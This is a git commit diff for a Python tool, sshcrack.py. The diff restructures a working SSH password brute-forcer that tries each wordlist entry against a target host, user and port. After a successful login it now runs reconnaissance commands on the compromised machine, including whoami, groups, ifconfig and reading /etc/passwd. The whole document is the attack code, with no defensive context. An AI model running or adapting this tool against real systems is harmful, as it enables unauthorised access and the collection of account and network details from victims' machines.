b6276c552b643fd9977e17abd197064c9087ae18
David Sanders <david.wm.sanders@gmail.com>
2017-11-27 05:11:02 +0000

    Add basic recon capability

--- sshcrack.py
+++ sshcrack.py
@@ -5,43 +5,55 @@ from pathlib import Path
 from pexpect import pxssh
 
 
-try:
-    wrd_arg = sys.argv[1]
-    usr_arg = sys.argv[2]
-    hst_arg = sys.argv[3]
-    prt_arg = sys.argv[4]
-except IndexError:
-    print("Usage: sshcrack.py WORDLIST USERNAME HOST PORT")
-    sys.exit(1)
-
-print("Arguments:", wrd_arg, usr_arg, hst_arg, prt_arg)
-
-wrd_pth = Path(__file__).parent / f"{wrd_arg}"
-if not wrd_pth.exists():
-    print(f"Word list '{wrd_pth.name}' not found")
-    sys.exit(1)
-
-pws = []
-with wrd_pth.open("r") as f:
-    for pw in f.read().split("\n"):
-        pws.append(pw)
-
-print(f"Loaded {len(pws)} passwords from '{wrd_pth.name}'")
-
-for pw in pws:
-    try:
-        ssh = pxssh.pxssh()
-        ssh.force_password = True
-        ssh.login(hst_arg, usr_arg, pw, port=prt_arg)
-    except pxssh.ExceptionPxssh as e:
-        if e.args[0] == "password refused":
-            print(f"Password is not '{pw}'")
-            continue
-        else:
-            raise
-    else:
-        print(f"Logged in! Password is '{pw}'")
-        ssh.sendline("uptime")
+def perform_recon(ssh):
+    print("Performing recon...\n")
+    cmds = ["uptime", "uname -a", "whoami",
+            "groups", "ifconfig", "cat /etc/passwd"]
+    for cmd in cmds:
+        ssh.sendline(cmd)
         ssh.prompt()
-        print(ssh.before.decode("utf-8"))
-        break
+        r = ssh.before.decode("utf-8")
+        print(r.strip("\r\n"))
+        print("\n")
+
+
+if __name__ == '__main__':
+    try:
+        wrd_arg = sys.argv[1]
+        usr_arg = sys.argv[2]
+        hst_arg = sys.argv[3]
+        prt_arg = sys.argv[4]
+    except IndexError:
+        print("Usage: sshcrack.py WORDLIST USERNAME HOST PORT")
+        sys.exit(1)
+
+    # print("Arguments:", wrd_arg, usr_arg, hst_arg, prt_arg)
+
+    wrd_pth = Path(__file__).parent / f"{wrd_arg}"
+    if not wrd_pth.exists():
+        print(f"Word list '{wrd_pth.name}' not found")
+        sys.exit(1)
+
+    pws = []
+    with wrd_pth.open("r") as f:
+        for pw in f.read().split("\n"):
+            pws.append(pw)
+
+    print(f"Loaded {len(pws)} passwords from '{wrd_pth.name}'")
+
+    for pw in pws:
+        try:
+            ssh = pxssh.pxssh()
+            ssh.force_password = True
+            ssh.login(hst_arg, usr_arg, pw, port=prt_arg)
+        except pxssh.ExceptionPxssh as e:
+            if e.args[0] == "password refused":
+                print(f"Password is not '{pw}'")
+                continue
+            else:
+                raise
+        else:
+            print(f"Logged in! Password is '{pw}'")
+            perform_recon(ssh)
+            ssh.logout()
+            break
